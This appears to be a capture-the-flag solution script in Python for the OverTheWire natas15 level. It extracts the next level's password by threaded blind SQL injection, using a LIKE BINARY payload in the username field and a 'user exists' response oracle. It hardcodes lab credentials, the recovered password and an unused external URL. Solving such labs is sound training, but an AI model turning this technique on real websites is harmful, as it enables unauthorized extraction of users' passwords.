import requests
import concurrent.futures
import string

def req(x):
    res = requests.get(url=url,auth=lvl_pass, params={'username':un_base+x, 'debug':'true'})
    if "This user exists." in res.text:
        return x
    else:
        return -1


def findLen(num):
    return num if req('_'*num) != -1 else -1

def filterChars(char):
    return char if req(f'%{char}%') != -1 else str(-1)

def findpw(g):
    global pw
    if req(pw+g+'%') != -1:
        pw +=g
        print(pw)
        return g
    else:
        return '-1'

def main():
    threads = 30
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        num = executor.map(findLen, list(range(1,43)))
    for x in num:
        if x > 0:
            pw_len = x
            print(pw_len)
    with concurrent.futures.ThreadPoolExecutor(max_workers=pw_len) as executor:
        ch = executor.map(filterChars, alphanum)
    for x in ch:
        if x != '-1':
            filt_chars.append(x)
    print(''.join(filt_chars))
    for x in range(pw_len):
        with concurrent.futures.ThreadPoolExecutor(max_workers=len(filt_chars)) as executor:
            ch = executor.map(findpw, filt_chars)




url = 'http://natas15.natas.labs.overthewire.org' 
url2 = 'http://maxjytyla.com/index.php'
lvl_pass = requests.auth.HTTPBasicAuth('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
un_base = 'natas16" AND password LIKE BINARY "'
alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
filt_chars = []
pw = ""


main()

'''
Who the hell needs to be GIVEN the password?
I'll construct that shit myself!
Username: natas16
Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
'''